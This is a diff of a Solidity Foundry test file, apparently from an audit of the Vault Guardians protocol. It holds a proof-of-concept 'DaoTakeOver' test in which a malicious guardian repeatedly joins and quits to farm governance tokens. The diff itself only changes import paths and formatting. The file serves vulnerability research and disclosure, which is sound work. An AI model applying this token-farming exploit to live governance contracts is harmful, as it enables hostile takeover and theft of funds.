@@ -1,12 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.20;
+pragma solidity ^0.8.20;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console} from "lib/forge-std/src//Test.sol";
 import {VaultSharesTest} from "../../test/unit/concrete/VaultSharesTest.t.sol";
-import {VaultGuardiansBaseTest} from "./unit/concrete/VaultGuardiansBaseTest.t.sol";
-import {VaultShares, IERC20} from "../src/protocol/VaultShares.sol";
-import {VaultGuardianGovernor} from "../src/dao/VaultGuardianGovernor.sol";
-import {VaultGuardianToken} from "../src/dao/VaultGuardianToken.sol";
+import {VaultGuardiansBaseTest} from "../../test/unit/concrete/VaultGuardiansBaseTest.t.sol";
+import {VaultShares, IERC20} from "../../src/protocol/VaultShares.sol";
+import {VaultGuardianGovernor} from "../../src/dao/VaultGuardianGovernor.sol";
+import {VaultGuardianToken} from "../../src/dao/VaultGuardianToken.sol";
 
 contract ProofOfCodes is VaultSharesTest {
     function testWrongBalance() public {
@@ -46,30 +46,50 @@ contract DaoTakeOver is VaultGuardiansBaseTest {
         assertEq(startingVoterWethBalance, 0);
 
         // 0. Flash loan the tokens, or just buy a bunch for 1 block
-        VaultGuardianGovernor governor = VaultGuardianGovernor(payable(vaultGuardians.owner()));
-        VaultGuardianToken vgToken = VaultGuardianToken(address(governor.token()));
+        VaultGuardianGovernor governor = VaultGuardianGovernor(
+            payable(vaultGuardians.owner())
+        );
+        VaultGuardianToken vgToken = VaultGuardianToken(
+            address(governor.token())
+        );
 
         // Malicious Guardian farms tokens
         weth.mint(mintAmount, maliciousGuardian); // The same amount as the other guardians
-        uint256 startingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
+        uint256 startingMaliciousVGTokenBalance = vgToken.balanceOf(
+            maliciousGuardian
+        );
         uint256 startingRegularVGTokenBalance = vgToken.balanceOf(guardian);
-        console.log("Malicious VGToken Balance:", startingMaliciousVGTokenBalance);
+        console.log(
+            "Malicious VGToken Balance:",
+            startingMaliciousVGTokenBalance
+        );
         console.log("Regular VGToken Balance:", startingRegularVGTokenBalance);
 
         vm.startPrank(maliciousGuardian);
         for (uint256 i; i < 10; i++) {
-            weth.approve(address(vaultGuardians), weth.balanceOf(maliciousGuardian));
-            address maliciousWethSharesVault = vaultGuardians.becomeGuardian(allocationData);
+            weth.approve(
+                address(vaultGuardians),
+                weth.balanceOf(maliciousGuardian)
+            );
+            address maliciousWethSharesVault = vaultGuardians.becomeGuardian(
+                allocationData
+            );
             IERC20(maliciousWethSharesVault).approve(
-                address(vaultGuardians), IERC20(maliciousWethSharesVault).balanceOf(maliciousGuardian)
+                address(vaultGuardians),
+                IERC20(maliciousWethSharesVault).balanceOf(maliciousGuardian)
             );
             vaultGuardians.quitGuardian();
         }
         vm.stopPrank();
 
-        uint256 endingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
+        uint256 endingMaliciousVGTokenBalance = vgToken.balanceOf(
+            maliciousGuardian
+        );
         uint256 endingRegularVGTokenBalance = vgToken.balanceOf(guardian);
-        console.log("Malicious VGToken Balance:", endingMaliciousVGTokenBalance);
+        console.log(
+            "Malicious VGToken Balance:",
+            endingMaliciousVGTokenBalance
+        );
         console.log("Regular VGToken Balance:", endingRegularVGTokenBalance);
     }
 }
